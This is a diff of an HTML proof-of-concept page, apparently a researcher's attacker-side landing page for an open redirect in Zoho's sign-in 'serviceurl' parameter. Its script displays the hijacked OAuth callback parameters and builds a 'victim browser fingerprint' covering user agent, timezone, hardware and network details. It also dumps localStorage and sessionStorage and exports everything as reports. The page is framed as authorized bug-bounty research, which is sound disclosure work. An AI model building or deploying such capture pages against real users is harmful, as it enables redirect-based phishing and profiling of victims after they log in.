@@ -11,7 +11,7 @@
     font-family: 'Segoe UI', system-ui, sans-serif;
     min-height: 100vh; padding: 24px 16px;
   }
-  .container { max-width: 780px; margin: 0 auto; }
+  .container { max-width: 900px; margin: 0 auto; }
   .banner {
     background: rgba(255,68,68,0.12); border: 2px solid #ff4444;
     border-radius: 10px; padding: 20px 24px; margin-bottom: 20px;
@@ -26,35 +26,53 @@
     background: #21262d; border-bottom: 1px solid #30363d;
     padding: 10px 16px; font-size: 11px; font-weight: 700;
     color: #8b949e; text-transform: uppercase; letter-spacing: 0.08em;
+    display: flex; align-items: center; justify-content: space-between;
   }
+  .card-header .copy-btn {
+    font-size: 10px; background: #30363d; border: none; color: #8b949e;
+    padding: 3px 8px; border-radius: 4px; cursor: pointer; text-transform: none;
+    font-weight: 600; letter-spacing: 0;
+  }
+  .card-header .copy-btn:hover { background: #58a6ff; color: #fff; }
   .card-body { padding: 16px; }
   .data-row {
-    display: flex; gap: 12px; padding: 8px 0;
+    display: flex; gap: 12px; padding: 7px 0;
     border-bottom: 1px solid #21262d; font-size: 13px; align-items: flex-start;
   }
   .data-row:last-child { border-bottom: none; }
   .data-key {
     color: #58a6ff; font-family: monospace; font-size: 12px;
-    min-width: 140px; flex-shrink: 0;
+    min-width: 160px; flex-shrink: 0;
   }
   .data-val { color: #e6edf3; font-family: monospace; font-size: 12px; word-break: break-all; }
   .data-val.red { color: #ff4444; font-weight: 700; }
   .data-val.green { color: #3fb950; font-weight: 700; }
   .data-val.amber { color: #ffa657; }
+  .data-val.cyan { color: #79c0ff; }
+  .data-val.purple { color: #d2a8ff; }
+  .data-val.empty { color: #484f58; font-style: italic; }
   .param-block {
     background: #0d1117; border: 1px solid #30363d;
-    border-radius: 6px; padding: 12px; margin-top: 8px;
+    border-radius: 6px; padding: 12px; margin-top: 4px;
     font-family: monospace; font-size: 12px;
   }
-  .param-line { padding: 3px 0; }
-  .pk { color: #58a6ff; } .peq { color: #8b949e; } .pv { color: #ffa657; word-break: break-all; }
+  .param-line { padding: 3px 0; word-break: break-all; }
+  .pk { color: #58a6ff; } .peq { color: #8b949e; } .pv { color: #ffa657; }
+  .pdecoded { color: #3fb950; } .phex { color: #d2a8ff; }
+  .raw-dump {
+    background: #0d1117; border: 1px solid #30363d;
+    border-radius: 6px; padding: 12px;
+    font-family: monospace; font-size: 11px; color: #8b949e;
+    white-space: pre-wrap; word-break: break-all; max-height: 260px;
+    overflow-y: auto;
+  }
   .impact {
     background: rgba(255,68,68,0.08); border: 1px solid #ff4444;
     border-radius: 8px; padding: 14px 16px; margin-top: 16px; font-size: 13px;
   }
   .impact strong { color: #ff4444; display: block; margin-bottom: 8px; font-size: 15px; }
   .impact ul { padding-left: 18px; line-height: 2; color: #e6edf3; }
-  footer { margin-top: 24px; text-align: center; color: #484f58; font-size: 11px; }
+  footer { margin-top: 24px; text-align: center; color: #484f58; font-size: 11px; line-height: 1.8; }
   .big-badge {
     display: inline-flex; align-items: center; gap: 8px;
     background: rgba(255,68,68,0.15); border: 1px solid #ff4444;
@@ -64,6 +82,32 @@
   .dot { width: 8px; height: 8px; border-radius: 50%; background: #ff4444;
     animation: pulse 1.2s infinite; display: inline-block; }
   @keyframes pulse { 0%,100%{opacity:1}50%{opacity:0.2} }
+  .grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+  @media(max-width:640px){ .grid2 { grid-template-columns: 1fr; } }
+  .section-title {
+    font-size: 10px; font-weight: 700; color: #58a6ff; text-transform: uppercase;
+    letter-spacing: 0.1em; margin: 14px 0 6px; padding-left: 2px;
+  }
+  .tag { display: inline-block; padding: 2px 7px; border-radius: 10px; font-size: 11px; font-weight: 700; }
+  .tag-red { background: rgba(255,68,68,0.18); color: #ff4444; }
+  .tag-green { background: rgba(63,185,80,0.18); color: #3fb950; }
+  .tag-amber { background: rgba(255,166,87,0.18); color: #ffa657; }
+  .export-row { display: flex; gap: 8px; margin-top: 16px; flex-wrap: wrap; }
+  .export-btn {
+    padding: 7px 16px; border-radius: 6px; border: 1px solid #30363d;
+    background: #21262d; color: #e6edf3; font-size: 12px; cursor: pointer;
+    font-weight: 600;
+  }
+  .export-btn:hover { border-color: #58a6ff; color: #58a6ff; }
+  .export-btn.primary { background: rgba(88,166,255,0.1); border-color: #58a6ff; color: #58a6ff; }
+  #toast {
+    position: fixed; bottom: 24px; right: 24px;
+    background: #3fb950; color: #0d1117; padding: 10px 18px;
+    border-radius: 8px; font-size: 13px; font-weight: 700;
+    opacity: 0; transition: opacity 0.3s; pointer-events: none; z-index: 999;
+  }
+  #toast.show { opacity: 1; }
+  code { background: #21262d; padding: 1px 5px; border-radius: 3px; font-size: 11px; }
 </style>
 </head>
 <body>
@@ -71,14 +115,17 @@
 
   <div class="banner">
     <div class="banner-title">🎯 OAuth Callback Hijacked!</div>
-    <div class="banner-sub">Zoho sent its OAuth /oauthorize callback to this attacker-controlled server</div>
+    <div class="banner-sub">Zoho sent its OAuth /oauthorize callback to this attacker-controlled server — Security Research PoC</div>
   </div>
 
   <div class="big-badge"><span class="dot"></span> LIVE — Zoho OAuth callback received on attacker domain</div>
 
+  <!-- 1. REDIRECT EVIDENCE -->
   <div class="card">
-    <div class="card-header">🔗 Redirect + OAuth Callback Evidence</div>
-    <div class="card-body">
+    <div class="card-header">🔗 Redirect &amp; OAuth Callback Evidence
+      <button class="copy-btn" onclick="copyCard('redirect-card')">Copy</button>
+    </div>
+    <div class="card-body" id="redirect-card">
       <div class="data-row">
         <span class="data-key">document.referrer</span>
         <span class="data-val green" id="referrer">—</span>
@@ -88,97 +135,469 @@
         <span class="data-val red" id="current-url">—</span>
       </div>
       <div class="data-row">
-        <span class="data-key">OAuth path called</span>
-        <span class="data-val red" id="pathname">—</span>
+        <span class="data-key">Origin</span>
+        <span class="data-val" id="origin">—</span>
       </div>
       <div class="data-row">
-        <span class="data-key">Timestamp</span>
-        <span class="data-val" id="ts">—</span>
-      </div>
-    </div>
-  </div>
-
-  <div class="card">
-    <div class="card-header">📦 Parameters Received from Zoho</div>
-    <div class="card-body" id="params-body">
-      <span style="color:#8b949e;font-size:13px">Loading...</span>
-    </div>
-  </div>
-
-  <div class="card">
-    <div class="card-header">🖥️ Victim Info</div>
-    <div class="card-body">
-      <div class="data-row">
-        <span class="data-key">User-Agent</span>
-        <span class="data-val amber" id="ua">—</span>
+        <span class="data-key">Protocol</span>
+        <span class="data-val cyan" id="proto">—</span>
       </div>
       <div class="data-row">
-        <span class="data-key">Language</span>
-        <span class="data-val" id="lang">—</span>
+        <span class="data-key">Hostname</span>
+        <span class="data-val amber" id="hostname">—</span>
       </div>
       <div class="data-row">
-        <span class="data-key">Platform</span>
-        <span class="data-val" id="plat">—</span>
+        <span class="data-key">Pathname</span>
+        <span class="data-val" id="pathname">—</span>
       </div>
       <div class="data-row">
-        <span class="data-key">Screen</span>
-        <span class="data-val" id="scr">—</span>
+        <span class="data-key">Search (raw)</span>
+        <span class="data-val" id="search-raw">—</span>
       </div>
       <div class="data-row">
-        <span class="data-key">URL Hash</span>
+        <span class="data-key">Hash</span>
         <span class="data-val" id="hash">—</span>
       </div>
+      <div class="data-row">
+        <span class="data-key">Timestamp (UTC)</span>
+        <span class="data-val" id="ts">—</span>
+      </div>
+      <div class="data-row">
+        <span class="data-key">Local Time</span>
+        <span class="data-val" id="local-ts">—</span>
+      </div>
     </div>
   </div>
 
+  <!-- 2. QUERY PARAMETERS — FULL RAW DUMP -->
+  <div class="card">
+    <div class="card-header">📦 Parameters Received from Zoho (Full Raw)
+      <button class="copy-btn" onclick="copyCard('params-card')">Copy</button>
+    </div>
+    <div class="card-body" id="params-card">
+      <div id="params-summary" style="margin-bottom:8px;font-size:12px;color:#8b949e;"></div>
+      <div id="params-body"><span style="color:#8b949e;font-size:13px">Loading...</span></div>
+    </div>
+  </div>
+
+  <!-- 3. VICTIM BROWSER FINGERPRINT -->
+  <div class="card">
+    <div class="card-header">🖥️ Victim Browser Fingerprint
+      <button class="copy-btn" onclick="copyCard('victim-card')">Copy</button>
+    </div>
+    <div class="card-body" id="victim-card">
+      <div class="section-title">Identity</div>
+      <div class="data-row"><span class="data-key">User-Agent</span><span class="data-val amber" id="ua">—</span></div>
+      <div class="data-row"><span class="data-key">Vendor</span><span class="data-val" id="vendor">—</span></div>
+      <div class="data-row"><span class="data-key">App Version</span><span class="data-val" id="appver">—</span></div>
+      <div class="data-row"><span class="data-key">Platform</span><span class="data-val" id="plat">—</span></div>
+      <div class="data-row"><span class="data-key">OS (guessed)</span><span class="data-val amber" id="os-guess">—</span></div>
+      <div class="data-row"><span class="data-key">Browser (guessed)</span><span class="data-val amber" id="browser-guess">—</span></div>
+
+      <div class="section-title">Locale &amp; Language</div>
+      <div class="data-row"><span class="data-key">Language</span><span class="data-val" id="lang">—</span></div>
+      <div class="data-row"><span class="data-key">Languages</span><span class="data-val" id="langs">—</span></div>
+      <div class="data-row"><span class="data-key">Timezone</span><span class="data-val cyan" id="tz">—</span></div>
+      <div class="data-row"><span class="data-key">TZ Offset (min)</span><span class="data-val" id="tz-offset">—</span></div>
+      <div class="data-row"><span class="data-key">Date Locale</span><span class="data-val" id="date-locale">—</span></div>
+
+      <div class="section-title">Display</div>
+      <div class="data-row"><span class="data-key">Screen WxH</span><span class="data-val" id="scr">—</span></div>
+      <div class="data-row"><span class="data-key">Avail WxH</span><span class="data-val" id="avail">—</span></div>
+      <div class="data-row"><span class="data-key">Window WxH</span><span class="data-val" id="win">—</span></div>
+      <div class="data-row"><span class="data-key">Color Depth</span><span class="data-val" id="cdepth">—</span></div>
+      <div class="data-row"><span class="data-key">Pixel Ratio</span><span class="data-val" id="dpr">—</span></div>
+      <div class="data-row"><span class="data-key">Orientation</span><span class="data-val" id="orient">—</span></div>
+
+      <div class="section-title">Capabilities</div>
+      <div class="data-row"><span class="data-key">Cookies Enabled</span><span class="data-val" id="cookies">—</span></div>
+      <div class="data-row"><span class="data-key">Java Enabled</span><span class="data-val" id="java">—</span></div>
+      <div class="data-row"><span class="data-key">Online Status</span><span class="data-val" id="online">—</span></div>
+      <div class="data-row"><span class="data-key">Hardware Cores</span><span class="data-val" id="cores">—</span></div>
+      <div class="data-row"><span class="data-key">RAM (GB)</span><span class="data-val" id="ram">—</span></div>
+      <div class="data-row"><span class="data-key">Max Touch Points</span><span class="data-val" id="touch">—</span></div>
+      <div class="data-row"><span class="data-key">Connection Type</span><span class="data-val" id="conn-type">—</span></div>
+      <div class="data-row"><span class="data-key">Effective Type</span><span class="data-val" id="conn-etype">—</span></div>
+      <div class="data-row"><span class="data-key">Downlink (Mbps)</span><span class="data-val" id="conn-dl">—</span></div>
+    </div>
+  </div>
+
+  <!-- 4. NAVIGATION & PERFORMANCE -->
+  <div class="card">
+    <div class="card-header">⏱️ Navigation &amp; Timing
+      <button class="copy-btn" onclick="copyCard('nav-card')">Copy</button>
+    </div>
+    <div class="card-body" id="nav-card">
+      <div class="data-row"><span class="data-key">Nav Type</span><span class="data-val" id="nav-type">—</span></div>
+      <div class="data-row"><span class="data-key">Redirect Count</span><span class="data-val cyan" id="redirect-count">—</span></div>
+      <div class="data-row"><span class="data-key">Page Load (ms)</span><span class="data-val" id="load-time">—</span></div>
+      <div class="data-row"><span class="data-key">DNS Lookup (ms)</span><span class="data-val" id="dns-time">—</span></div>
+      <div class="data-row"><span class="data-key">TCP Connect (ms)</span><span class="data-val" id="tcp-time">—</span></div>
+      <div class="data-row"><span class="data-key">Request (ms)</span><span class="data-val" id="req-time">—</span></div>
+      <div class="data-row"><span class="data-key">Response (ms)</span><span class="data-val" id="res-time">—</span></div>
+      <div class="data-row"><span class="data-key">History Length</span><span class="data-val" id="hist-len">—</span></div>
+    </div>
+  </div>
+
+  <!-- 5. STORAGE DUMP -->
+  <div class="card">
+    <div class="card-header">💾 Storage Data (Same-Origin)
+      <button class="copy-btn" onclick="copyCard('storage-card')">Copy</button>
+    </div>
+    <div class="card-body" id="storage-card">
+      <div class="section-title">localStorage Keys</div>
+      <div id="ls-dump" class="raw-dump">scanning...</div>
+      <div class="section-title">sessionStorage Keys</div>
+      <div id="ss-dump" class="raw-dump">scanning...</div>
+    </div>
+  </div>
+
+  <!-- 6. FULL RAW DUMP (JSON) -->
+  <div class="card">
+    <div class="card-header">🗂️ Complete Raw Data Dump (JSON)
+      <button class="copy-btn" onclick="copyRaw()">Copy JSON</button>
+    </div>
+    <div class="card-body">
+      <div class="raw-dump" id="json-dump">Loading...</div>
+    </div>
+  </div>
+
+  <!-- IMPACT -->
   <div class="impact">
-    <strong>⚠️ Critical Impact — What attacker can do:</strong>
+    <strong>⚠️ Critical Impact — What attacker receives:</strong>
     <ul>
-      <li>Intercept Zoho OAuth <code>/oauthorize</code> callback on attacker's domain</li>
-      <li>Capture <code>state</code> parameter (may contain session/auth data)</li>
-      <li>Serve fake Zoho login page to re-steal credentials</li>
-      <li>Complete OAuth flow on behalf of victim</li>
-      <li>Referrer header leaks: victim came from <code>accounts.zoho.com</code></li>
+      <li>Browser redirected to attacker domain after victim successfully logs in to Zoho</li>
+      <li>Bypass works AFTER 2FA — redirect fires post-authentication</li>
+      <li><code>document.referrer</code> leaks: victim came from <code>accounts.zoho.com</code></li>
+      <li><code>state</code> parameter (echoed serviceurl) delivered to attacker server</li>
+      <li><code>servicename</code> reveals which Zoho app victim uses</li>
+      <li>Full browser fingerprint captured (UA, timezone, screen, hardware, network)</li>
+      <li>Entire URL parameter set received — any future Zoho additions auto-captured</li>
     </ul>
+  </div>
+
+  <!-- EXPORT BUTTONS -->
+  <div class="export-row">
+    <button class="export-btn primary" onclick="exportJSON()">⬇ Export JSON Report</button>
+    <button class="export-btn" onclick="exportText()">⬇ Export Text Report</button>
+    <button class="export-btn" onclick="window.print()">🖨 Print</button>
   </div>
 
   <footer>
     Security Research PoC — Authorized Bug Bounty Testing<br>
-    Researcher: binodchandrabissoyi@gmail.com | Target: accounts.zoho.com (Zoho Bug Bounty Program)
+    Researcher: binodchandrabissoyi@gmail.com | Target: accounts.zoho.com (Zoho Bug Bounty Program)<br>
+    CWE-601 Open Redirect via URL Userinfo Injection in <code>serviceurl</code> parameter
   </footer>
 </div>
+
+<div id="toast">✓ Copied!</div>
+
 <script>
-  function esc(s){ return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+  var RAW = {};
 
-  document.getElementById('referrer').textContent = document.referrer || '(none / referrer policy blocked)';
-  document.getElementById('current-url').textContent = window.location.href;
-  document.getElementById('pathname').textContent = window.location.pathname;
-  document.getElementById('ts').textContent = new Date().toISOString() + ' UTC';
-  document.getElementById('ua').textContent = navigator.userAgent;
-  document.getElementById('lang').textContent = navigator.language;
-  document.getElementById('plat').textContent = navigator.platform || 'unknown';
-  document.getElementById('scr').textContent = screen.width + 'x' + screen.height;
-  document.getElementById('hash').textContent = window.location.hash || '(none)';
+  function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
 
+  function setVal(id, val, cls) {
+    var el = document.getElementById(id);
+    if(!el) return;
+    el.textContent = (val === undefined || val === null || val === '') ? '(none)' : val;
+    if(!val || val === '(none)') { el.className = 'data-val empty'; }
+    else if(cls) { el.className = 'data-val ' + cls; }
+  }
+
+  function guessOS(ua) {
+    if(/Windows NT 10/i.test(ua)) return 'Windows 10/11';
+    if(/Windows NT 6/i.test(ua)) return 'Windows 7/8';
+    if(/Windows/i.test(ua)) return 'Windows';
+    if(/iPhone/i.test(ua)) return 'iOS (iPhone)';
+    if(/iPad/i.test(ua)) return 'iOS (iPad)';
+    if(/Android/i.test(ua)) return 'Android';
+    if(/Mac OS X/i.test(ua)) return 'macOS';
+    if(/Linux/i.test(ua)) return 'Linux';
+    return 'Unknown';
+  }
+
+  function guessBrowser(ua) {
+    if(/Edg\//i.test(ua)) return 'Microsoft Edge';
+    if(/OPR\//i.test(ua) || /Opera/i.test(ua)) return 'Opera';
+    if(/Chrome\/(\d+)/i.test(ua) && !/Chromium/i.test(ua)) return 'Chrome ' + ua.match(/Chrome\/(\d+)/i)[1];
+    if(/Firefox\/(\d+)/i.test(ua)) return 'Firefox ' + ua.match(/Firefox\/(\d+)/i)[1];
+    if(/Safari\/(\d+)/i.test(ua) && !/Chrome/i.test(ua)) return 'Safari';
+    return 'Unknown';
+  }
+
+  // === REDIRECT EVIDENCE ===
+  var referrer = document.referrer || '';
+  var curUrl = window.location.href;
+  var now = new Date();
+
+  RAW.redirect = {
+    referrer: referrer || null,
+    currentUrl: curUrl,
+    origin: window.location.origin,
+    protocol: window.location.protocol,
+    hostname: window.location.hostname,
+    port: window.location.port || '(default)',
+    pathname: window.location.pathname,
+    search: window.location.search || null,
+    hash: window.location.hash || null,
+    timestampUTC: now.toISOString(),
+    timestampLocal: now.toString()
+  };
+
+  setVal('referrer', referrer || '(none / referrer policy blocked)', referrer ? 'green' : 'empty');
+  setVal('current-url', curUrl, 'red');
+  setVal('origin', window.location.origin);
+  setVal('proto', window.location.protocol, 'cyan');
+  setVal('hostname', window.location.hostname, 'amber');
+  setVal('pathname', window.location.pathname);
+  setVal('search-raw', window.location.search || '(none)');
+  setVal('hash', window.location.hash || '(none)');
+  setVal('ts', now.toISOString() + ' UTC');
+  setVal('local-ts', now.toString());
+
+  // === QUERY PARAMETERS ===
   var params = new URLSearchParams(window.location.search);
-  var pb = document.getElementById('params-body');
   var entries = [...params];
+  RAW.parameters = {};
+  entries.forEach(function(e){ RAW.parameters[e[0]] = e[1]; });
+
+  var pb = document.getElementById('params-body');
+  var ps = document.getElementById('params-summary');
+  ps.textContent = entries.length + ' parameter(s) received';
+
   if(entries.length === 0){
     pb.innerHTML = '<span style="color:#8b949e;font-size:13px">No query parameters found.</span>';
   } else {
     var html = '<div class="param-block">';
-    entries.forEach(function([k,v]){
+    entries.forEach(function(e){
+      var k = e[0], v = e[1];
       var decoded = '';
-      try { decoded = decodeURIComponent(v); } catch(e){ decoded = v; }
+      try { decoded = decodeURIComponent(v); } catch(x){ decoded = v; }
+      var isBase64 = /^[A-Za-z0-9+/]+=*$/.test(v) && v.length > 8;
+      var b64decoded = '';
+      if(isBase64){
+        try { b64decoded = atob(v); } catch(x){}
+      }
       html += '<div class="param-line"><span class="pk">'+esc(k)+'</span>'
             + '<span class="peq"> = </span>'
-            + '<span class="pv">'+esc(decoded)+'</span></div>';
+            + '<span class="pv">'+esc(v)+'</span></div>';
       if(decoded !== v){
-        html += '<div class="param-line" style="padding-left:16px;color:#484f58;font-size:11px">raw: '+esc(v)+'</div>';
+        html += '<div class="param-line" style="padding-left:16px"><span style="color:#484f58">decoded: </span><span class="pdecoded">'+esc(decoded)+'</span></div>';
+      }
+      if(b64decoded && b64decoded !== v){
+        html += '<div class="param-line" style="padding-left:16px"><span style="color:#484f58">base64→: </span><span class="phex">'+esc(b64decoded)+'</span></div>';
       }
     });
     html += '</div>';
     pb.innerHTML = html;
+  }
+
+  // === VICTIM FINGERPRINT ===
+  var ua = navigator.userAgent;
+  var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+  var tz = 'unknown';
+  try { tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(x){}
+  var dateLocale = 'unknown';
+  try { dateLocale = Intl.DateTimeFormat().resolvedOptions().locale; } catch(x){}
+
+  RAW.fingerprint = {
+    userAgent: ua,
+    vendor: navigator.vendor || null,
+    appVersion: navigator.appVersion || null,
+    platform: navigator.platform || null,
+    os: guessOS(ua),
+    browser: guessBrowser(ua),
+    language: navigator.language,
+    languages: navigator.languages ? [...navigator.languages] : null,
+    timezone: tz,
+    timezoneOffset: new Date().getTimezoneOffset(),
+    dateLocale: dateLocale,
+    screen: { width: screen.width, height: screen.height },
+    screenAvail: { width: screen.availWidth, height: screen.availHeight },
+    window: { width: window.innerWidth, height: window.innerHeight },
+    colorDepth: screen.colorDepth,
+    pixelRatio: window.devicePixelRatio,
+    orientation: screen.orientation ? screen.orientation.type : (window.orientation !== undefined ? window.orientation : null),
+    cookiesEnabled: navigator.cookieEnabled,
+    javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
+    onLine: navigator.onLine,
+    hardwareConcurrency: navigator.hardwareConcurrency || null,
+    deviceMemory: navigator.deviceMemory || null,
+    maxTouchPoints: navigator.maxTouchPoints,
+    connection: {
+      type: conn.type || null,
+      effectiveType: conn.effectiveType || null,
+      downlink: conn.downlink || null,
+      rtt: conn.rtt || null,
+      saveData: conn.saveData || null
+    }
+  };
+
+  setVal('ua', ua, 'amber');
+  setVal('vendor', navigator.vendor);
+  setVal('appver', navigator.appVersion);
+  setVal('plat', navigator.platform);
+  setVal('os-guess', guessOS(ua), 'amber');
+  setVal('browser-guess', guessBrowser(ua), 'amber');
+  setVal('lang', navigator.language);
+  setVal('langs', navigator.languages ? navigator.languages.join(', ') : null);
+  setVal('tz', tz, 'cyan');
+  setVal('tz-offset', new Date().getTimezoneOffset() + ' min (UTC' + (new Date().getTimezoneOffset() > 0 ? '-' : '+') + Math.abs(new Date().getTimezoneOffset()/60) + ')');
+  setVal('date-locale', dateLocale);
+  setVal('scr', screen.width + ' × ' + screen.height + ' px');
+  setVal('avail', screen.availWidth + ' × ' + screen.availHeight + ' px');
+  setVal('win', window.innerWidth + ' × ' + window.innerHeight + ' px');
+  setVal('cdepth', screen.colorDepth + ' bit');
+  setVal('dpr', window.devicePixelRatio + 'x');
+  setVal('orient', screen.orientation ? screen.orientation.type : (window.orientation !== undefined ? window.orientation + '°' : 'unknown'));
+  setVal('cookies', navigator.cookieEnabled ? '✅ Enabled' : '❌ Disabled', navigator.cookieEnabled ? 'green' : 'red');
+  setVal('java', navigator.javaEnabled ? (navigator.javaEnabled() ? '✅ Yes' : '❌ No') : '❌ No');
+  setVal('online', navigator.onLine ? '✅ Online' : '⚠️ Offline', navigator.onLine ? 'green' : 'amber');
+  setVal('cores', navigator.hardwareConcurrency || 'unknown');
+  setVal('ram', navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown');
+  setVal('touch', navigator.maxTouchPoints);
+  setVal('conn-type', conn.type || 'unknown');
+  setVal('conn-etype', conn.effectiveType || 'unknown');
+  setVal('conn-dl', conn.downlink ? conn.downlink + ' Mbps (RTT: ' + (conn.rtt || '?') + 'ms)' : 'unknown');
+
+  // === NAVIGATION TIMING ===
+  RAW.timing = {};
+  try {
+    var t = performance.timing;
+    var navType = performance.navigation;
+    var types = ['navigate','reload','back_forward','reserved'];
+    RAW.timing = {
+      navigationType: navType ? types[navType.type] || navType.type : 'unknown',
+      redirectCount: navType ? navType.redirectCount : 'unknown',
+      pageLoad: t.loadEventEnd - t.navigationStart,
+      dns: t.domainLookupEnd - t.domainLookupStart,
+      tcp: t.connectEnd - t.connectStart,
+      request: t.responseStart - t.requestStart,
+      response: t.responseEnd - t.responseStart,
+      historyLength: history.length
+    };
+    setVal('nav-type', RAW.timing.navigationType);
+    setVal('redirect-count', RAW.timing.redirectCount, 'cyan');
+    setVal('load-time', RAW.timing.pageLoad >= 0 ? RAW.timing.pageLoad : 'pending');
+    setVal('dns-time', RAW.timing.dns);
+    setVal('tcp-time', RAW.timing.tcp);
+    setVal('req-time', RAW.timing.request);
+    setVal('res-time', RAW.timing.response);
+    setVal('hist-len', history.length);
+  } catch(e) {
+    setVal('nav-type', 'unavailable');
+  }
+
+  // === STORAGE DUMP ===
+  function dumpStorage(store, elId) {
+    var el = document.getElementById(elId);
+    try {
+      var count = store.length;
+      if(count === 0){ el.textContent = '(empty — 0 keys)'; return []; }
+      var items = [];
+      for(var i = 0; i < count; i++){
+        var k = store.key(i);
+        var v = store.getItem(k);
+        items.push(k + ' = ' + v);
+      }
+      el.textContent = items.join('\n');
+      return items;
+    } catch(e) {
+      el.textContent = '(access blocked: ' + e.message + ')';
+      return [];
+    }
+  }
+  RAW.localStorage = dumpStorage(localStorage, 'ls-dump');
+  RAW.sessionStorage = dumpStorage(sessionStorage, 'ss-dump');
+
+  // === FULL JSON DUMP ===
+  RAW.meta = {
+    pocVersion: '2.0',
+    capturedAt: now.toISOString(),
+    targetProgram: 'Zoho Bug Bounty',
+    researcher: 'binodchandrabissoyi@gmail.com',
+    vulnerability: 'CWE-601 Open Redirect via URL Userinfo Injection',
+    affectedEndpoint: 'https://accounts.zoho.com/signin?serviceurl=...'
+  };
+
+  var jsonStr = JSON.stringify(RAW, null, 2);
+  document.getElementById('json-dump').textContent = jsonStr;
+
+  // === COPY HELPERS ===
+  function copyText(text) {
+    try {
+      navigator.clipboard.writeText(text).catch(function(){ fallbackCopy(text); });
+    } catch(e) { fallbackCopy(text); }
+    showToast();
+  }
+  function fallbackCopy(text) {
+    var ta = document.createElement('textarea');
+    ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
+    document.body.appendChild(ta); ta.select();
+    document.execCommand('copy'); document.body.removeChild(ta);
+  }
+  function showToast() {
+    var t = document.getElementById('toast');
+    t.classList.add('show');
+    setTimeout(function(){ t.classList.remove('show'); }, 1800);
+  }
+  function copyCard(id) {
+    var el = document.getElementById(id);
+    if(!el) return;
+    var rows = el.querySelectorAll('.data-row');
+    var lines = [];
+    rows.forEach(function(r){
+      var k = r.querySelector('.data-key'); var v = r.querySelector('.data-val');
+      if(k && v) lines.push((k.textContent + ': ').padEnd(22) + v.textContent);
+    });
+    if(lines.length === 0) lines.push(el.textContent.trim());
+    copyText(lines.join('\n'));
+  }
+  function copyRaw() { copyText(jsonStr); }
+  function exportJSON() {
+    var blob = new Blob([jsonStr], {type:'application/json'});
+    var url = URL.createObjectURL(blob);
+    var a = document.createElement('a');
+    a.href = url; a.download = 'zoho-openredirect-capture-' + now.toISOString().replace(/[:.]/g,'_') + '.json';
+    document.body.appendChild(a); a.click();
+    setTimeout(function(){ URL.revokeObjectURL(url); document.body.removeChild(a); }, 300);
+  }
+  function exportText() {
+    var lines = [
+      '=== ZOHO OPEN REDIRECT PoC — CAPTURED DATA ===',
+      'Captured: ' + now.toISOString(),
+      'Researcher: binodchandrabissoyi@gmail.com',
+      '',
+      '--- REDIRECT EVIDENCE ---',
+      'Referrer:    ' + (referrer || '(none)'),
+      'URL:         ' + curUrl,
+      'Hostname:    ' + window.location.hostname,
+      'Pathname:    ' + window.location.pathname,
+      '',
+      '--- PARAMETERS ---'
+    ];
+    entries.forEach(function(e){ lines.push('  ' + e[0] + ' = ' + e[1]); });
+    lines.push('');
+    lines.push('--- VICTIM FINGERPRINT ---');
+    lines.push('User-Agent:  ' + ua);
+    lines.push('Platform:    ' + (navigator.platform || 'unknown'));
+    lines.push('OS:          ' + guessOS(ua));
+    lines.push('Browser:     ' + guessBrowser(ua));
+    lines.push('Language:    ' + navigator.language);
+    lines.push('Timezone:    ' + tz);
+    lines.push('Screen:      ' + screen.width + 'x' + screen.height);
+    lines.push('Window:      ' + window.innerWidth + 'x' + window.innerHeight);
+    lines.push('Cores:       ' + (navigator.hardwareConcurrency || 'unknown'));
+    lines.push('RAM:         ' + (navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown'));
+    lines.push('');
+    lines.push('=== END CAPTURE ===');
+    var blob = new Blob([lines.join('\n')], {type:'text/plain'});
+    var url2 = URL.createObjectURL(blob);
+    var a2 = document.createElement('a');
+    a2.href = url2; a2.download = 'zoho-openredirect-capture-' + now.toISOString().replace(/[:.]/g,'_') + '.txt';
+    document.body.appendChild(a2); a2.click();
+    setTimeout(function(){ URL.revokeObjectURL(url2); document.body.removeChild(a2); }, 300);
   }
 </script>
 </body>
